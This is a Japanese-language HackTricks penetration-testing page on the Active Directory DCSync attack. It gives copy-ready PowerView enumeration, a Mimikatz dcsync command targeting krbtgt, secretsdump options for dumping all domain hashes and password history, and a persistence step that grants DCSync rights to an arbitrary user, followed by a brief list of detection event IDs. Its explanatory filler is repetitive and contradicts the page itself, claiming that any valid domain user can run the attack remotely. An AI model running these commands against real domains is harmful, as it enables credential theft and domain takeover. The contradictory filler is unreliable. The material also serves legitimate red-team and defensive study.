# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したり、HackTricksを**PDFでダウンロード**したりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>

## DCSync

**DCSync**権限は、ドメイン自体に対して次の権限を持つことを意味します：**DS-Replication-Get-Changes**、**Replicating Directory Changes All**、および**Replicating Directory Changes In Filtered Set**。

**DCSyncに関する重要な注意事項：**

* **DCSync攻撃は、ドメインコントローラの動作をシミュレートし、他のドメインコントローラに情報のレプリケーションを要求**します。これは、MS-DRSR（Directory Replication Service Remote Protocol）を使用するものであり、Active Directoryの有効で必要な機能であるため、オフまたは無効にすることはできません。
* デフォルトでは、**Domain Admins、Enterprise Admins、Administrators、およびDomain Controllers**グループのみが必要な特権を持っています。
* もし、任意のアカウントのパスワードが可逆暗号化で保存されている場合、Mimikatzにはパスワードを平文で返すオプションがあります。

### 列挙

`powerview`を使用してこれらの権限を持つユーザーをチェックします：
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### ローカルでの攻撃

DCSyncは、Active Directory（AD）ドメインコントローラ（DC）からユーザーのハッシュを取得するための攻撃手法です。この攻撃手法を使用すると、攻撃者はドメイン内の任意のユーザーアカウントのハッシュを取得できます。

DCSync攻撃を実行するためには、攻撃者はドメイン内の有効なユーザーアカウントを持つ必要があります。攻撃者は、攻撃対象のドメインコントローラに対して特権を持つアクセス権を取得する必要があります。

以下は、DCSync攻撃の手順です。

1. 攻撃者は、攻撃対象のドメインコントローラに対して特権を持つアクセス権を取得します。

2. 攻撃者は、攻撃対象のドメインコントローラに対してDCSync攻撃を実行します。これにより、攻撃者はドメイン内の任意のユーザーアカウントのハッシュを取得できます。

DCSync攻撃は、攻撃者がドメイン内のユーザーアカウントのハッシュを取得するための効果的な手法です。攻撃者はこれらのハッシュを使用して、パスワードの解析や他の攻撃手法に利用することができます。
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### リモートでの攻撃

DCSyncは、Active Directory（AD）ドメインコントローラ（DC）からユーザーのハッシュを取得するための攻撃手法です。この攻撃手法を使用すると、攻撃者はドメイン内のユーザーアカウントのハッシュを取得し、そのハッシュを使用して認証をバイパスすることができます。

DCSync攻撃をリモートで実行するためには、攻撃者は有効なドメインユーザーアカウントを持っている必要があります。攻撃者は、このアカウントを使用してドメインコントローラに接続し、DCSync攻撃を実行します。

以下は、リモートでDCSync攻撃を実行する手順です。

1. 攻撃者は有効なドメインユーザーアカウントを取得します。
2. 攻撃者は、攻撃対象のドメインコントローラにリモートで接続します。
3. 攻撃者は、DCSync攻撃を実行するための適切なツールを使用します。このツールは、攻撃者がドメインコントローラに接続した後に実行する必要があります。
4. 攻撃者は、DCSync攻撃を実行するための適切なコマンドを入力します。このコマンドは、攻撃者がユーザーアカウントのハッシュを取得するために使用します。
5. 攻撃者は、取得したハッシュを使用して認証をバイパスすることができます。

リモートでDCSync攻撃を実行することにより、攻撃者はドメイン内のユーザーアカウントのハッシュを取得し、そのハッシュを使用して権限を乗っ取ることができます。この攻撃手法は、セキュリティ上の脆弱性を悪用するため、適切なセキュリティ対策が必要です。
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc`は3つのファイルを生成します：

* NTLMハッシュを含む1つのファイル
* Kerberosキーを含む1つのファイル
* [可逆暗号化](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)が有効になっているNTDSのクリアテキストパスワードを含む1つのファイル。可逆暗号化が有効なユーザーは次のコマンドで取得できます。

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### 持続性

ドメイン管理者であれば、`powerview`のヘルプを使用してこれらの権限を任意のユーザーに付与することができます。
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
次に、**ユーザーが正しく割り当てられているかどうかを確認**することができます。これには、以下の出力から特権の名前を見つける必要があります（特権の名前は「ObjectType」フィールド内に表示されます）:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### 緩和策

* セキュリティイベントID 4662（オブジェクトの監査ポリシーが有効である必要があります）- オブジェクトに対して操作が実行されました
* セキュリティイベントID 5136（オブジェクトの監査ポリシーが有効である必要があります）- ディレクトリサービスオブジェクトが変更されました
* セキュリティイベントID 4670（オブジェクトの監査ポリシーが有効である必要があります）- オブジェクトのアクセス許可が変更されました
* AD ACLスキャナー - ACLの作成と比較を行い、レポートを作成します。 [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## 参考文献

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか？または、HackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化されたワークフローを簡単に構築および自動化します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
